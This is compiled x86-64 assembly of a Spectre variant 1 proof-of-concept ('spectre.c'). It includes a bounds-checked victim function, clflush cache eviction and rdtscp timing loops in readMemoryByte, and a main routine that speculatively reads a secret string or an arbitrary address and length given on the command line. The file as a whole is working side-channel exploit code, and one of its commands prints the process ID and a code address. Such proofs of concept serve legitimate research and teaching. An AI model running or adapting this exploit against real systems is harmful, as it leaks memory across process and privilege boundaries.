	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	test
	.type	test, @function
test:
.LFB5690:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	rax, rdi
	jbe	.L2
	lea	rax, array1[rip]
	cmp	BYTE PTR [rax+rdi], sil
	je	.L4
.L2:
	ret
.L4:
	movzx	esi, sil
	lea	rax, array2[rip]
	movzx	eax, BYTE PTR [rax+rsi]
	and	BYTE PTR temp[rip], al
	jmp	.L2
	.cfi_endproc
.LFE5690:
	.size	test, .-test
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	endbr64
	movzx	esi, BYTE PTR check_value[rip]
	call	test
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR 8[rsp], rdi
	mov	QWORD PTR 16[rsp], rsi
	mov	QWORD PTR 24[rsp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 32[rsp], 0
	lea	rax, results.0[rip]
	lea	rdx, 1024[rax]
.L7:
	mov	DWORD PTR [rax], 0
	add	rax, 4
	cmp	rdx, rax
	jne	.L7
	mov	DWORD PTR 4[rsp], 999
	lea	r15, array2[rip]
	lea	r14, results.0[rip]
	jmp	.L8
.L10:
	movsx	rax, ebx
	imul	rax, rax, 715827883
	shr	rax, 32
	mov	edx, ebx
	sar	edx, 31
	sub	eax, edx
	lea	edx, [rax+rax*2]
	add	edx, edx
	mov	eax, ebx
	sub	eax, edx
	sub	eax, 1
	mov	ax, 0
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r12
	xor	rdi, rbp
	call	victim_function
	sub	ebx, 1
	cmp	ebx, -1
	je	.L31
.L12:
	clflush	array1_size[rip]
	mov	DWORD PTR 36[rsp], 0
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jg	.L10
.L11:
	mov	eax, DWORD PTR 36[rsp]
	add	eax, 1
	mov	DWORD PTR 36[rsp], eax
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jle	.L11
	jmp	.L10
.L31:
	rdtscp
	mov	rsi, rax
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rsi, rdx
	movsx	rax, DWORD PTR [rsp]
	movzx	eax, BYTE PTR [r15+rax]
	rdtscp
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rax, rdx
	sub	rax, rsi
	cmp	rax, 50
	ja	.L13
	add	DWORD PTR [r14+r13*4], 1
.L13:
	add	r13, 1
	cmp	r13, 256
	je	.L32
.L14:
	mov	DWORD PTR [rsp], r13d
	mov	BYTE PTR check_value[rip], r13b
	mov	ebx, 29
	jmp	.L12
.L32:
	mov	edx, 1
	mov	eax, 0
	jmp	.L15
.L21:
	mov	ebx, eax
	mov	eax, ecx
.L16:
	add	rdx, 1
.L15:
	mov	ecx, edx
	cmp	rdx, 256
	je	.L33
	test	eax, eax
	js	.L21
	mov	esi, DWORD PTR [r14+rdx*4]
	movsx	rdi, eax
	cmp	esi, DWORD PTR [r14+rdi*4]
	jge	.L22
	test	ebx, ebx
	js	.L23
	movsx	rdi, ebx
	cmp	esi, DWORD PTR [r14+rdi*4]
	cmovge	ebx, ecx
	jmp	.L16
.L22:
	mov	ebx, eax
	mov	eax, ecx
	jmp	.L16
.L23:
	mov	ebx, ecx
	jmp	.L16
.L33:
	movsx	rdx, ebx
	mov	ecx, DWORD PTR [r14+rdx*4]
	movsx	rdx, eax
	mov	edx, DWORD PTR [r14+rdx*4]
	lea	esi, 4[rcx+rcx]
	cmp	esi, edx
	jl	.L18
	test	ecx, ecx
	jne	.L24
	cmp	edx, 2
	je	.L18
.L24:
	sub	DWORD PTR 4[rsp], 1
	je	.L18
.L8:
	mov	eax, DWORD PTR 4[rsp]
	lea	rdx, array2[rip]
.L9:
	clflush	[rdx]
	add	rdx, 512
	lea	rsi, array2[rip+131072]
	cmp	rsi, rdx
	jne	.L9
	mov	ecx, DWORD PTR array1_size[rip]
	cdq
	idiv	ecx
	movsx	rbp, edx
	mov	r13d, 0
	mov	r12, QWORD PTR 8[rsp]
	xor	r12, rbp
	jmp	.L14
.L18:
	lea	rcx, results.0[rip]
	mov	edx, DWORD PTR results.0[rip]
	xor	edx, DWORD PTR 32[rsp]
	mov	DWORD PTR results.0[rip], edx
	mov	rsi, QWORD PTR 16[rsp]
	mov	BYTE PTR [rsi], al
	cdqe
	mov	eax, DWORD PTR [rcx+rax*4]
	mov	rdx, QWORD PTR 24[rsp]
	mov	DWORD PTR [rdx], eax
	mov	BYTE PTR 1[rsi], bl
	movsx	rbx, ebx
	mov	eax, DWORD PTR [rcx+rbx*4]
	mov	DWORD PTR 4[rdx], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L34
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L34:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
.L36:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L55
	cmp	al, 10
	je	.L36
	cmp	al, 105
	jne	.L47
	mov	eax, 0
	call	getpid@PLT
	mov	ecx, eax
	lea	rdx, check[rip+33]
	lea	rsi, .LC12[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L36
.L55:
	mov	rdx, QWORD PTR secret[rip]
	mov	rcx, rdx
	lea	rsi, .LC2[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	lea	rbx, array1[rip]
	sub	rax, rbx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	DWORD PTR 28[rsp], eax
	mov	BYTE PTR check_value[rip], 1
	lea	rax, array2[rip]
	lea	rdx, 131072[rax]
.L38:
	mov	BYTE PTR [rax], 1
	add	rax, 1
	cmp	rax, rdx
	jne	.L38
	cmp	DWORD PTR 4[rsp], 3
	je	.L56
.L39:
	mov	edx, DWORD PTR 28[rsp]
	lea	rsi, .LC6[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	js	.L36
	mov	ebp, 0
	lea	r15, .LC7[rip]
	lea	r14, .LC0[rip]
	lea	r13, .LC1[rip]
	jmp	.L45
.L56:
	lea	rdx, 32[rsp]
	mov	rbx, QWORD PTR 8[rsp]
	mov	rdi, QWORD PTR 8[rbx]
	lea	rsi, .LC3[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	lea	rax, array1[rip]
	sub	QWORD PTR 32[rsp], rax
	lea	rdx, 28[rsp]
	mov	rdi, QWORD PTR 16[rbx]
	lea	rsi, .LC4[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	lea	rsi, .LC5[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L39
.L43:
	lea	rsi, .LC11[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	add	rbp, 1
	test	eax, eax
	js	.L36
.L45:
	mov	rax, QWORD PTR secret[rip]
	movsx	ecx, BYTE PTR [rax+rbp]
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	lea	rdx, 44[rsp]
	lea	rsi, 54[rsp]
	call	readMemoryByte
	mov	r12d, DWORD PTR 44[rsp]
	mov	ebx, DWORD PTR 48[rsp]
	lea	eax, [rbx+rbx]
	cmp	r12d, eax
	mov	rdx, r13
	cmovge	rdx, r14
	lea	rsi, .LC8[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	movzx	edx, BYTE PTR 54[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, r12d
	lea	rsi, .LC9[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	test	ebx, ebx
	jle	.L43
	movzx	edx, BYTE PTR 55[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, ebx
	lea	rsi, .LC10[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L43
.L47:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L57
	mov	eax, 0
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	check_value
	.data
	.type	check_value, @object
	.size	check_value, 1
check_value:
	.byte	1
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
